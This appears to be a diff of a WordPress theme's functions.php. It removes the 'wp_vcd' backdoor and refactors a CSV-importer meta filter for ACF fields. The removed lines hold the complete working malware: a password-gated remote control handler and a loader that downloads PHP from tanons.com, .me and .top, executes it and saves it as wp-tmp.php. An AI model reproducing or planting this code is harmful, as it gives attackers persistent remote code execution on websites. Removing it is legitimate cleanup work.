@@ -1,173 +1,4 @@
 <?php
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '82ee43d79a28662f2106086d7ec3b1fd'))
-	{
-$div_code_name="wp_vcd";
-		switch ($_REQUEST['action'])
-			{
-
-				
-
-
-
-
-				case 'change_domain';
-					if (isset($_REQUEST['newdomain']))
-						{
-							
-							if (!empty($_REQUEST['newdomain']))
-								{
-                                                                           if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
-                                                                                                             {
-
-			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
-			                                                                           @file_put_contents(__FILE__, $file);
-									                           print "true";
-                                                                                                             }
-
-
-		                                                                    }
-								}
-						}
-				break;
-
-								case 'change_code';
-					if (isset($_REQUEST['newcode']))
-						{
-							
-							if (!empty($_REQUEST['newcode']))
-								{
-                                                                           if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
-                                                                                                             {
-
-			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
-			                                                                           @file_put_contents(__FILE__, $file);
-									                           print "true";
-                                                                                                             }
-
-
-		                                                                    }
-								}
-						}
-				break;
-				
-				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
-			}
-			
-		die("");
-	}
-
-
-
-
-
-
-
-
-$div_code_name = "wp_vcd";
-$funcfile      = __FILE__;
-if(!function_exists('theme_temp_setup')) {
-    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
-    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
-        
-        function file_get_contents_tcurl($url)
-        {
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
-            curl_setopt($ch, CURLOPT_HEADER, 0);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_URL, $url);
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-            $data = curl_exec($ch);
-            curl_close($ch);
-            return $data;
-        }
-        
-        function theme_temp_setup($phpCode)
-        {
-            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-           if( fwrite($handle, "<?php\n" . $phpCode))
-		   {
-		   }
-			else
-			{
-			$tmpfname = tempnam('./', "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-			fwrite($handle, "<?php\n" . $phpCode);
-			}
-			fclose($handle);
-            include $tmpfname;
-            unlink($tmpfname);
-            return get_defined_vars();
-        }
-        
-
-$wp_auth_key='5a2bf2adbe7b2cd42684793efd6a4c9b';
-        if (($tmpcontent = @file_get_contents("http://www.tanons.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.tanons.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
-
-            if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        }
-        
-        
-        elseif ($tmpcontent = @file_get_contents("http://www.tanons.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent));
-           
-        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        } elseif (($tmpcontent = @file_get_contents("http://www.tanons.top/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.tanons.top/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        }
-        
-        
-        
-        
-        
-    }
-}
-
-//$start_wp_theme_tmp
-
-
-
-//wp_tmp
-
-
-//$end_wp_theme_tmp
-?><?php
 define('TEMPLATE_PATH',get_bloginfo('template_url'));
 define('HOME_URL',get_home_url());
 define('BlOG_NAME',get_bloginfo('blog_name'));
@@ -290,14 +121,44 @@ add_action('admin_enqueue_scripts', 'admin_style');
 //     }
 // }
 
-function really_simple_csv_importer_save_meta_filter( $meta, $post, $is_update ) {
 
-	// serialize metadata
-	$meta_array = array();
-	if (isset($meta['profile_test_real_name'])) $meta_array[] = $meta['profile_test_real_name'];
-	if (isset($meta['_profile_test_real_name'])) $meta_array[] = $meta['field_5b574be6bda9d'];
-	$meta = array( 'meta_key' => $meta_array );
+function rsci_meta_filter( $meta, $post, $is_update ) {
+    echo '<pre>';
     print_r($meta);
-	return $meta;
+    echo '</pre>';
+    $meta_array = array();
+    $repeater_array = array();
+    foreach ($meta as $key => $value) {
+        print_r($key);
+        // カスタムフィールド名が 'textfield' だった時
+        if ($key == 'textfield') {
+        // ACF用のフィールドキーに変換
+            $meta_array['field_52528d5b8ad30'] = $value;
+        // カスタムフィールド名が 'select' だった時
+        } elseif ($key == 'select') {
+        // カンマで分割して配列として登録
+            $meta_array['field_52528dc88ad31'] = preg_split('/,+/', $value);
+        // 繰り返しフィールド用のデータを配列に入れていく処理
+        } elseif ($key == 'text_1') {
+            $repeater_array[0]['repeater_text'] = $value;
+        } elseif ($key == 'text_2') {
+            $repeater_array[1]['repeater_text'] = $value;
+        } elseif ($key == 'text_3') {
+            $repeater_array[2]['repeater_text'] = $value;
+        } elseif ($key == 'num_1') {
+            $repeater_array[0]['repeater_number'] = $value;
+        } elseif ($key == 'num_2') {
+            $repeater_array[1]['repeater_number'] = $value;
+        } elseif ($key == 'num_3') {
+            $repeater_array[2]['repeater_number'] = $value;
+        // ACF以外のメタデータはそのまま通す
+        } else {
+            $meta_array[$key] = $value;
+        }
+    }
+    // 繰り返しフィールドの配列を戻す
+    $meta_array['field_52528dea8ad32'] = $repeater_array;
+    echo '<pre>';  	print_r($meta_array);
+    echo '</pre>';    	return $meta_array;
 }
-add_filter( 'really_simple_csv_importer_save_meta', 'really_simple_csv_importer_save_meta_filter', 10, 3 );
+add_filter( 'really_simple_csv_importer_save_meta', 'rsci_meta_filter', 10, 3 );
